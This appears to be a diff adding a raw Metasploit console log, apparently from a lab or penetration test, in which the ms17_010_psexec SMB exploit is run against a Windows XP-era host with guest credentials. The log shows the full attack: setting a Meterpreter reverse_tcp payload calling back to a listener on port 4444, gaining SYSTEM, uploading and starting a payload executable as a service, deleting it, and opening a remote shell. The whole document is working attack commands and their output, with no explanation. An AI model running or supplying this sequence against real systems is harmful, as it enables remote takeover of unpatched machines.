@@ -1,0 +1,38 @@
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> use exploit/windows/smb/ms17_010_psexec
+[*] Using configured payload windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOST 192.168.193.211
+RHOST => 192.168.193.211
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set SMBUser guest
+SMBUser => guest
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set SMBPass ''
+SMBPass =>
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 192.168.193.71
+LHOST => 192.168.193.71
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LPORT 4444
+LPORT => 4444
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit
+
+[*] Started reverse TCP handler on 192.168.193.71:4444
+[*] 192.168.193.211:445 - Authenticating to 192.168.193.211 as user 'guest'...
+[*] 192.168.193.211:445 - Target OS: Windows 5.1
+[*] 192.168.193.211:445 - Filling barrel with fish... done
+[*] 192.168.193.211:445 - <---------------- | Entering Danger Zone | ---------------->
+[*] 192.168.193.211:445 - [*] Preparing dynamite...
+[*] 192.168.193.211:445 - [*] Trying stick 1 (x86)...Boom!
+[*] 192.168.193.211:445 - [+] Successfully Leaked Transaction!
+[*] 192.168.193.211:445 - [+] Successfully caught Fish-in-a-barrel
+[*] 192.168.193.211:445 - <---------------- | Leaving Danger Zone | ---------------->
+[*] 192.168.193.211:445 - Reading from CONNECTION struct at: 0x81fce8e0
+[*] 192.168.193.211:445 - Built a write-what-where primitive...
+[+] 192.168.193.211:445 - Overwrite complete... SYSTEM session obtained!
+[*] 192.168.193.211:445 - Selecting native target
+[*] 192.168.193.211:445 - Uploading payload... UAVnqmlt.exe
+[*] 192.168.193.211:445 - Created \UAVnqmlt.exe...
+[+] 192.168.193.211:445 - Service started successfully...
+[*] Sending stage (175686 bytes) to 192.168.193.211
+[*] 192.168.193.211:445 - Deleting \UAVnqmlt.exe...
+[*] Meterpreter session 1 opened (192.168.193.71:4444 -> 192.168.193.211:1032) at 2023-02-25 01:17:35 +0100
+
+(Meterpreter 1)(C:\WINDOWS\system32) >
